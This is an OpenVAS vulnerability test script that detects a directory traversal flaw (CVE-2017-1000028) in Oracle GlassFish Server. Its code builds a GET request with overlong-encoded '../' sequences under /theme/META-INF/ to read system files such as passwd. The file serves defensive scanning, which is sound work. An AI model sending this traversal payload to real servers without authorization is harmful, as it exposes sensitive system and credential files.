###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_glass_fish_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# Oracle Glass Fish Server Directory Traversal Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:oracle:glassfish_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806848");
  script_version("$Revision: 7577 $");
  script_cve_id("CVE-2017-1000028");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2016-01-27 14:43:03 +0530 (Wed, 27 Jan 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Oracle Glass Fish Server Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Glass fish server
  and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to get the content of passwd file.");

  script_tag(name:"insight", value:"The flaw is due to
  - Improper sanitization of parameter 'META-INF' in 'theme.php' file.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to gain access to sensitive information.

  Impact Level:  System/Application");

  script_tag(name:"affected", value:"Oracle Glassfish Server version 4.1.1
  and probably prior.");

  script_tag(name:"solution" , value:"No solution or patch was made available for at least one year since disclosure of this vulnerability.
   Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL" , value:"https://www.exploit-db.com/exploits/39241");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("GlassFish_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("GlassFish/installed");
  script_require_ports("Services/www", 4848, 8080, 8181);
  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

# Variable Initialization
url = "";
http_port = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
 exit(0);
}

## iterate over list
files = traversal_files();

foreach file (keys(files))
{
  ##Construct Attack Request
  url = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae'+
        '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%'+
        'c0%ae%c0%ae/'+ files[file];

  ## Try attack and check the response to confirm vulnerability
  if(http_vuln_check(port:http_port, url:url, pattern:file))
  {
    report = report_vuln_url( port:http_port, url:url );
    security_message(port:http_port, data:report);
    exit(0);
  }
}
